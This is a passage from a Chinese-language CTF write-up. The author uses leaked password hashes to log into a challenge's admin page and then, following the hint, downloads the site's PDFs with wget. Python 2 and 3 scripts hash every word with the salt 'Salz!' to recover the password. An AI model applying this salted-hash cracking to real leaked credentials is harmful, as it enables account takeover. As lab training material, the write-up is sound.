| 3    | hansi  | 34b0bb7c304949f9ff2fc101eef0f048be10d3bd | the password is password      |

拿password里面3个md5值去解密，发现只有admin的解的出：

![](https://pic.hujiekang.top/uploads/big/9ffae77587d776d5a006f19fb6878722.png)

正好`admin.php`里面用户名默认也给的admin，于是尝试密码`ThinJerboa`，直接拿到flag：

![](https://pic.hujiekang.top/uploads/big/4a5789041bb4b939dc0a6892c92b7efc.png)

当然还有hint没用，我觉得这肯定不是出题者的本意，看了hint发现`my fav word in my fav paper?!`，是不是意味着这个单词可能藏在那些论文里面呢？

于是就一个一个下载下来（后来发现用wget直接递归下载`wget http://xxxxxx/ -r -np -nd -A .pdf`），然后接下来就是读PDF中的单词，把配合字符串`"Salz!"`输出的sha1值去和`password`比对。

看了一眼别人的WriteUp，都用的Python2，而且我跑出来还报错。。。于是查了一下自己写了一个Python3的，用的是`pdfplumber`模块，用起来还算简单。

都贴一下吧：

```python
# Python2
from cStringIO import StringIO
from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter
from pdfminer.converter import TextConverter
from pdfminer.layout import LAParams
from pdfminer.pdfpage import PDFPage
import sys
import string
import os
import hashlib

def get_pdf():
    return [i for i in os.listdir("./") if i.endswith("pdf")]

def convert_pdf_2_text(path):
    rsrcmgr = PDFResourceManager()
    retstr = StringIO()
    device = TextConverter(rsrcmgr, retstr, codec='utf-8', laparams=LAParams())
    interpreter = PDFPageInterpreter(rsrcmgr, device)
    with open(path, 'rb') as fp:
        for page in PDFPage.get_pages(fp, set()):
            interpreter.process_page(page)
        text = retstr.getvalue()
    device.close()
    retstr.close()
    return text

def find_password():
    pdf_path = get_pdf()
    for i in pdf_path:
        print "Searching word in " + i
        pdf_text = convert_pdf_2_text(i).split(" ")
        for word in pdf_text:
            sha1_password = hashlib.sha1(word+"Salz!").hexdigest()
            if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c':
                print "Find the password :" + word
                exit()

if __name__ == "__main__":
    find_password()


# Python3
import os
import hashlib
import pdfplumber

def get_pdf():
    return [i for i in os.listdir() if i.endswith("pdf")]

def convert_pdf_2_text(filename):
    pdf = pdfplumber.open(filename)
    text = ""
    for page in pdf.pages:
        text += page.extract_text()
    pdf.close()
    return text

def find_password():
    pdf_path = get_pdf()
    for i in pdf_path:
        print("Searching word in " + i)
        pdf_text = convert_pdf_2_text(i).split(" ")
        for word in pdf_text:
            sha1_password = hashlib.sha1((word+"Salz!").encode("utf-8")).hexdigest()
            print("sha1(\""+word+"\"+\"Salz!\")="+sha1_password)
            if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c':
                print("Find the password :" + word)
                exit()

if __name__ == "__main__":
    find_password()
```

然后跑了一下脚本，也能拿到这个单词`ThinJerboa`。

![](https://pic.hujiekang.top/uploads/big/36f6d429d0d6e043a7d867881da0a9e4.png)
